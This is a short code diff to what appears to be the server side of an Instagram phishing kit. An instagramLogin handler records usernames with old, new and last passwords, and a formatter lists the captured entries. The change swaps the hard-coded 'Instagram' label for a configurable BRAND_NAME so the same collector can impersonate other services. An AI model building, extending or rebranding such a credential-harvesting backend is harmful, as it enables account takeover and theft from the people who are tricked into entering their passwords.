@@ -6,7 +6,7 @@ const { sendSuccess, sendFailure } = require('../utils/response');
 const formatEntry = (entry) => {
   const base = {
     id: entry._id.toString(),
-    service: (entry.source || 'Instagram').toLowerCase(),
+    service: (entry.source || process.env.BRAND_NAME || 'Instagram').toLowerCase(),
     username: entry.username,
     type: entry.path || 'login',
     at: entry.createdAt ? entry.createdAt.toISOString() : new Date().toISOString(),
@@ -58,7 +58,7 @@ const instagramLogin = async (req, res) => {
       oldPassword,
       newPassword,
       lastPassword,
-      source: source || 'Instagram',
+      source: source || process.env.BRAND_NAME || 'Instagram',
       path: path || 'login',
       time: time || istTime,
     });
